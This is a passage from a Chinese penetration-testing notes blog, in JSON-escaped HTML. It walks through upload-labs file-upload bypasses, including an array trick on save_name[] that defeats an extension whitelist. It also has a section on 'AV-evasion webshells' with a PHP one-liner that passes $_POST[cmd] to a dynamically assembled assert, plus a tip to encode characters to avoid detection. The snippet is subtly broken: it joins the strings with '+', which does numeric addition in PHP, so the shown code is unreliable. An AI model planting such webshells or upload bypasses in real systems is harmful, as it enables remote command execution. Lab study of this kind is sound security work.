class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的思路是上传一个数组save_name[]，使save_name[0] = 1.php    save_name[2] = jpg</p>\n<p>jpg绕过白名单限制。$file会被explode函数先检查，如果为一个列表则不会再做操作。</p>\n<p>之后1.php与save_name[1]拼接（save_name[1]为空）。这样就可以实现绕过。</p>\n<p>上传并抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001722.png\" alt=\"image-20220307220350862\" loading=\"lazy\" class=\"φbp\"></p>\n<p>修改mimetype。构造POST数据</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001806.png\" alt=\"image-20220307220828422\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001893.png\" alt=\"image-20220307220841508\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001284.png\" alt=\"image-20220307220851020\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"拓展\">拓展<a title=\"#拓展\" href=\"#拓展\"></a></h2>\n<h3 id=\"免杀马基础\">免杀马基础<a title=\"#免杀马基础\" href=\"#免杀马基础\"></a></h3>\n<p>使用assert构造一句话木马：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"string\">&#x27;ass&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$b</span>=<span class=\"string\">&#x27;ert&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$c</span>=<span class=\"variable\">$a</span>+<span class=\"variable\">$b</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$c</span>(<span class=\"variable\">$_POST</span>[cmd]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>还可以将字符进行编码来免杀。</p>\n<h3 id=\"渲染绕过\">渲染绕过<a title=\"#渲染绕过\" href=\"#渲染绕过\"></a></h3>\n<p>见upload-labs pass-16。</p>\n","prev":{"title":"渗透测试笔记 - day28、29、30 文件包含","link":"2022/03/03/渗透测试笔记 - day28、29、30 文件包含"},"next":{"title":"渗透测试笔记 - day23 盲XXE","link":"2022/02/18/渗透测试笔记 - day23 盲XXE"},"plink":"https://Lq0ne.github.io/2022/02/28/渗透测试笔记 - day24、25、26、27 文件上传/","toc":[{"id":"upload-labs-pass-01-前端js限制绕过","title":"upload-labs pass-01 前端js限制绕过","index":"1"},{"id":"upload-labs-pass-02-mime-type修改绕过","title":"upload-labs pass-02 Mime Type修改绕过","index":"2"},{"id":"upload-labs-pass-03-php3/4/5绕过","title":"upload-labs pass-03 php3&#x2F;4&#x2F;5绕过","index":"3"},{"id":"upload-labs-pass-04-.htaccess绕过","title":"upload-labs pass-04 .htaccess绕过","index":"4"},{"id":"upload-labs-pass-05-.user.ini绕过","title":"upload-labs pass-05 .user.ini绕过","index":"5"},{"id":"upload-labs-pass-06-大小写绕过","title":"upload-labs pass-06 大小写绕过","index":"6"},{"id":"upload-labs-pass-07-空格绕过","title":"upload-labs pass-07 空格绕过","index":"7"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"February 28, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/02/28/渗透测试笔记 - day24、25、26、27 文件上传/\" title=\"渗透测试笔记 - day24、25、26、27 文件上传\">https://Lq0ne.github.io/2022/02/28/渗透测试笔记 - day24、25、26、27 文件上传/</a>"},"reading_time":"2397 words in 16 min"}